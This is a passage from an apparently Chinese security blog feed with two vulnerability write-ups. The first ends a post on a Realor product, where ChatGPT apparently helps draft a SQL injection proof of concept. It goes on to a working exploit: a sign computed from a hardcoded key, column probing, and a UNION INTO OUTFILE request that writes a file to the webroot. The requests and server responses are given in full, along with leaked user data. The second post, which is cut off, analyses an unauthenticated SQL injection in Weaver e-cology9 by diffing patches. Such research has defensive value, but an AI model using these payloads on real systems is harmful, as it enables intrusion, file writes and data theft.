这个POST请求将在目标站点上触发该SQL盲注漏洞。为了防止这类SQL注入攻击，建议使用预处理语句和参数化查询，以及更新的数据库扩展，如<code>mysqli</code>或<code>PDO</code>。</p></blockquote><blockquote><p><strong>问</strong>：请基于如上POC进行改进，注意PHP代码中的几个参数：key、initParams、sign，提示这三个参数在POST请求的位置不位于body部分，而是位于URI位置。</p></blockquote><blockquote><p><strong>答</strong>：根据提示，我们需要将<code>key</code>、<code>initParams</code>和<code>sign</code>参数放在URI中，并将<code>account</code>、<code>userPwd</code>和<code>userGroupId</code>放在请求的body部分。这里是一个改进后的POC，其中包含了<code>initParams</code>、<code>key</code>和<code>sign</code>参数在URI中的设置。</p><p>假设我们已经知道<code>key</code>的值为<code>inner</code>，这意味着<code>keyVal</code>为<code>Realor</code>，并且已经获取了合适的<code>initParams</code>。为了生成<code>sign</code>值，我们需要计算<code>md5($initparams . $keyVal)</code>。</p><p>以下是一个包含<code>initParams</code>、<code>key</code>和<code>sign</code>参数的示例URI：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/your_script.php?initParams=command_createUser__user_admin__pwd_password&amp;key=inner&amp;sign=5f1c9d2d2b3a7e1e23b8e767c53d12f6</span><br></pre></td></tr></table></figure><p>现在我们需要构造一个包含恶意<code>account</code>值的JSON格式的POST请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/your_script.php?initParams=command_createUser__user_admin__pwd_password&amp;key=inner&amp;sign=5f1c9d2d2b3a7e1e23b8e767c53d12f6</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target_site.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>...</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;account&quot;</span>: <span class="string">&quot;test<span class="subst">\&quot;</span> OR <span class="subst">\&quot;</span>1<span class="subst">\&quot;</span>=<span class="subst">\&quot;</span>1&quot;</span>,<span class="string">&quot;userPwd&quot;</span>: <span class="string">&quot;any_password&quot;</span>,<span class="string">&quot;userGroupId&quot;</span>: <span class="string">&quot;any_group_id&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>  这个POST请求将在目标站点上触发该SQL盲注漏洞。为了防止这类SQL注入攻击，建议使用预处理语句和参数化查询，以及更新的数据库扩展，如<code>mysqli</code>或<code>PDO</code>。</p></blockquote><blockquote><p><strong>点评</strong>：ChatGPT回答的效果取决于提问者提出问题的质量，学会提问，能够清晰地表述自己的问题这是一个关键。如上回答已经很接近正式的POC了，至少它将<code>initParams</code> 参数给构造出来了。</p></blockquote><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>那么使用ChatGPT作为辅助再结合人本身的能力，可以较为轻松地分析构造出真正的POC。</p><p>首先需要说明的是，该漏洞目前影响最新7.0.3.1版本，如下请求可以获取版本号。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/RAPAgent.XGI?CMD=GetClientExeVer</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 14 Apr 2023 11:25:41 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=n0hbfs5jlf6ca759lv5l4nstv1; path=/; HttpOnly</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="section">[result]</span></span></span><br><span class="line"><span class="language-ini"><span class="attr">result</span>=<span class="number">0</span></span></span><br><span class="line"><span class="language-ini"><span class="attr">Version</span>=<span class="number">7.0</span>.<span class="number">3.1</span></span></span><br></pre></td></tr></table></figure><p>先计算<code>sign</code>的值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ keyVal=<span class="string">&quot;Realor&quot;</span></span><br><span class="line">$ initParams=<span class="string">&quot;command_createUser__user_admin__pwd_123&quot;</span></span><br><span class="line">$ <span class="built_in">echo</span> -n $initParams<span class="variable">$keyVal</span> | md5</span><br><span class="line">455bb32c0eb81692d75438a140c166e4</span><br></pre></td></tr></table></figure><p>然后构造如下POC内容，先使用<code>ORDER BY</code>语句确认列数，如下结果测试于7.0.3.1版本，其列数是31，但在7.0.2.1版本中测试得出列数为32。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ConsoleExternalApi.XGI?key=inner&amp;initParams=command_createUser__user_admin__pwd_123&amp;sign=455bb32c0eb81692d75438a140c166e4</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=60ql548qeb56e9tvsjo1mjnnq5; CookieLanguageName=ZH-CN; think_languague=zh-CN; UserAuthtype=0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http:// 192.168.21.89:8081/ConsoleExternalApi.XGI</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>53</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;account&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&#x27; ORDER BY 31-- -&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;userPwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 14 Apr 2023 11:31:10 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>51</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;要添加的账户已存在！&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ConsoleExternalApi.XGI?key=inner&amp;initParams=command_createUser__user_admin__pwd_123&amp;sign=455bb32c0eb81692d75438a140c166e4</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=60ql548qeb56e9tvsjo1mjnnq5; CookieLanguageName=ZH-CN; think_languague=zh-CN; UserAuthtype=0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http:// 192.168.21.89:8081/ConsoleExternalApi.XGI</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>53</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;account&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&#x27; ORDER BY 32-- -&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;userPwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 14 Apr 2023 11:31:21 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>45</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;添加用户数据失败&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>那么接下来就可以直接<code>INTO OUTFILE</code>写文件了。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ConsoleExternalApi.XGI?key=inner&amp;initParams=command_createUser__user_admin__pwd_123&amp;sign=455bb32c0eb81692d75438a140c166e4</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=60ql548qeb56e9tvsjo1mjnnq5; CookieLanguageName=ZH-CN; think_languague=zh-CN; UserAuthtype=0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http:// 192.168.21.89:8081/ConsoleExternalApi.XGI</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>270</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-n1ql">&#123;&quot;account&quot;:&quot;admin&#x27; UNION ALL <span class="keyword">SELECT</span> <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="string">&#x27;D7UFszUIaH8TOo&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;./../../WebRoot/js/D7-UFs.txt&#x27;</span>-- -<span class="string">&quot;, &quot;</span>userPwd<span class="string">&quot;:&quot;</span><span class="number">123</span><span class="string">&quot;&#125;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 14 Apr 2023 11:31:34 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>45</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;添加用户数据失败&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>最后成功验证。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/js/D7-UFs.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.21.89:8081</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 14 Apr 2023 11:32:29 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Fri, 14 Apr 2023 11:31:34 GMT</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>&quot;db50000000dc875-133-5f94a2ef6444a&quot;</span><br><span class="line"><span class="attribute">Accept-Ranges</span><span class="punctuation">: </span>bytes</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>307</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"></span><br><span class="line"><span class="language-livescript">usr00000001Admin<span class="number">0</span><span class="number">1</span>usr00000002<span class="number">202cb</span>962ac59075b964b07152d234b70SrookgZ6qtg=SprIrCtPWPOw9o9Ok1DJgJIJLZY=ZB4SodE3MowGSAPseW1O<span class="string">\N</span><span class="number">1</span><span class="string">\N</span><span class="string">\N</span><span class="number">2023</span>-<span class="number">03</span>-<span class="number">15</span><span class="number">2</span><span class="string">\N</span><span class="string">\N</span><span class="number">0</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="number">0</span><span class="number">0</span><span class="string">\N</span><span class="number">100000</span><span class="string">\N</span><span class="number">0</span><span class="string">\N</span></span></span><br><span class="line"><span class="language-livescript"><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span><span class="string">\N</span>D7UFszUIaH8TOo</span></span><br><span class="line"><span class="language-livescript"></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> sql </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微e-cology9 browser.jsp SQL注入漏洞分析</title>
      <link href="/weaver-ecology9-browser-sqli.html"/>
      <url>/weaver-ecology9-browser-sqli.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E5%BC%95%E5%AD%90">0x00 引子</a></li><li><a href="#0x01-%E8%A1%A5%E4%B8%81%E5%8C%85%E5%AF%B9%E6%AF%94">0x01 补丁包对比</a></li><li><a href="#0x02-%E7%A1%AE%E5%AE%9A%E6%BC%8F%E6%B4%9E%E4%BD%8D%E7%BD%AE">0x02 确定漏洞位置</a></li><li><a href="#0x03-%E8%A1%A5%E4%B8%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">0x03 补丁代码分析</a></li><li><a href="#0x04-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90">0x04 SQL注入分析</a></li><li><a href="#0x05-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90">0x05 认证绕过分析</a></li></ul><h2 id="0x00-引子"><a href="#0x00-引子" class="headerlink" title="0x00 引子"></a>0x00 引子</h2><p>2023年02月23日，微步发布了一个关于泛微e-cology9 SQL注入的漏洞通告。如下图所示，根据其说明，受影响的版本范围是&lt;&#x3D;10.55版本。另外，他们还提到该漏洞无权限要求，并不是后台洞。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230225181503065.png"></p><h2 id="0x01-补丁包对比"><a href="#0x01-补丁包对比" class="headerlink" title="0x01 补丁包对比"></a>0x01 补丁包对比</h2><p>E-COLOGY安全补丁下载网址如下：</p><p><a href="https://www.weaver.com.cn/cs/securityDownload.html?src=cn">https://www.weaver.com.cn/cs/securityDownload.html?src=cn</a></p><p>通过如下两个链接，下载该次漏洞的以及上一个版本的补丁包：</p><p>v10.55：<a href="https://www.weaver.com.cn/cs/package/Ecology_security_20221014_v10.55.zip">https://www.weaver.com.cn/cs/package/Ecology_security_20221014_v10.55.zip</a></p><p>v10.56：<a href="https://www.weaver.com.cn/cs/package/Ecology_security_20230213_v10.56.zip">https://www.weaver.com.cn/cs/package/Ecology_security_20230213_v10.56.zip</a></p><p>将两个补丁压缩包分别解压，然后使用IDEA工具对比差异。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230225204339203.png"></p><p>这里对比看了很久，但是却没有看出有价值的内容。</p><p>嗯？先了解下<code>web.xml</code>文件中的内容。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230301154357757.png"></p><p>在开头存在一个<code>SecurityFilter</code>的过滤器，<code>SecurityFilter</code>在初始化时会调用<code>weaver.security.filter.SecurityMain</code>中的<code>initFilterBean</code>方法初始化安全规则。而在<code>weaver.security.rules.ruleImp</code>包中的每个类差不多就是每次打的补丁，此包中的类将被重点关注。</p><p>所以，缩小范围去补丁包的<code>WEB-INF/myclasses/weaver/security/rules/ruleImp</code>目录寻找。并且我们还可以根据文件时间戳，将2022年10月前的补丁文件都排除在外，继续过滤一遍。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security/rules/ruleImp» <span class="built_in">stat</span> -f %SB----%N *.class | grep -v <span class="string">&quot;2021----&quot;</span> | grep -v -E <span class="string">&#x27;^[Jan|Mar|Apr|May|Jul|Aug|Sep].*2022&#x27;</span> | <span class="built_in">wc</span> -l</span><br><span class="line">     125</span><br></pre></td></tr></table></figure><p>这样还剩下125个补丁文件，然后通过<a href="https://github.com/skylot/jadx">jadx</a>这款反编译工具一次性打开这些补丁文件，然后搜索<code>Xss(Validate failed</code>关键词，不断寻找，最终找到了一段SQL注入漏洞的补丁代码，下图所框疑似就是本次漏洞的位置。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230301163444206.png"></p><p>上图所示的补丁代码，所处如下位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ Ecology_security_20230213_v10.56 » fd SecurityRuleForMobileBrowser</span><br><span class="line">WEB-INF/myclasses/weaver/security/rules/ruleImp/SecurityRuleForMobileBrowser.class</span><br></pre></td></tr></table></figure><p>然而在v10.55补丁包中也同样发现该文件所在，并且是一摸一样的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ Ecology_security_20221014_v10.55 » fd SecurityRuleForMobileBrowser</span><br><span class="line">WEB-INF/myclasses/weaver/security/rules/ruleImp/SecurityRuleForMobileBrowser.class</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ patch » md5 Ecology_security_20230213_v10.56/WEB-INF/myclasses/weaver/security/rules/ruleImp/SecurityRuleForMobileBrowser.class Ecology_security_20221014_v10.55/WEB-INF/myclasses/weaver/security/rules/ruleImp/SecurityRuleForMobileBrowser.class | awk -F <span class="string">&quot;=&quot;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line"> 391d53bb28cffa1bf6974e21eac16b7d</span><br><span class="line"> 391d53bb28cffa1bf6974e21eac16b7d</span><br></pre></td></tr></table></figure><p>查看这两个文件的时间戳，发现最后修改时间也是一致，都是2022年12月8日。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ patch » <span class="built_in">stat</span> -f %SB Ecology_security_20230213_v10.56/WEB-INF/myclasses/weaver/security/rules/ruleImp/SecurityRuleForMobileBrowser.class Ecology_security_20221014_v10.55/WEB-INF/myclasses/weaver/security/rules/ruleImp/SecurityRuleForMobileBrowser.class</span><br><span class="line">Dec  8 19:55:26 2022</span><br><span class="line">Dec  8 19:55:26 2022</span><br></pre></td></tr></table></figure><p>但是在下载v10.55补丁包的时候，通过其下载链接，可以得知此版本补丁包的发布日期是2022年10月14日。是早于其中的<code>SecurityRuleForMobileBrowser.class</code>文件的最后修改时间的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.weaver.com.cn/cs/package/Ecology_security_20221014_v10.55.zip</span><br></pre></td></tr></table></figure><p>在通过微步关于这个漏洞的通告中的时间线中，大致可以猜测出来，他们在2022年9月，正值HW期间收到该漏洞，在2022月12月上报给监管单位，监管单位应该是收到了该漏洞就立马通知给厂商，在2022年12月8日厂商就已经开发出本次SQL注入漏洞的补丁代码，也就是<code>SecurityRuleForMobileBrowser.class</code>文件中的内容。但厂商在开发出该漏洞的补丁代码后并未立即发布v10.56补丁包，而是先将其更新至v10.55补丁包中了。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230225210416116.png"></p><p>这也就是为什么用IDEA对比v10.55和v10.56补丁包，却一无所获的原因。</p><p>那么既然如此，拿v10.54补丁包与v10.56补丁包对比呢？v10.54补丁包下载地址如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.weaver.com.cn/cs/package/Ecology_security_20220805_v10.54.zip</span><br></pre></td></tr></table></figure><p>如下图所示，确实对比出了该文件存在于V10.56中，而不存在于V10.54中。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230225212954101.png"></p><h2 id="0x02-确定漏洞位置"><a href="#0x02-确定漏洞位置" class="headerlink" title="0x02 确定漏洞位置"></a>0x02 确定漏洞位置</h2><p>虽然通过如上的补丁包对比分析找到了一个疑似的漏洞路径，但是未必就能肯定这是真正的漏洞位置。</p><p>我们先来简单看看<code>/mobile/plugin/browser.jsp</code>的内容。</p><p><img src="/img/post/weaver-ecology9-browser-sqli/20230225213535824.png"></p><p>参数很多，继续往下看，发现一个<code>isDis</code>参数及其判断语句。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">isDis</span> <span class="operator">=</span> <span class="string">&quot;1&quot;</span>.equals(Util.null2String(request.getParameter(<span class="string">&quot;isDis&quot;</span>))) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (!isDis) &#123;</span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/mobile/plugin/dialog.jsp&quot;</span>).forward(request, response);</span><br><span class="line"><span 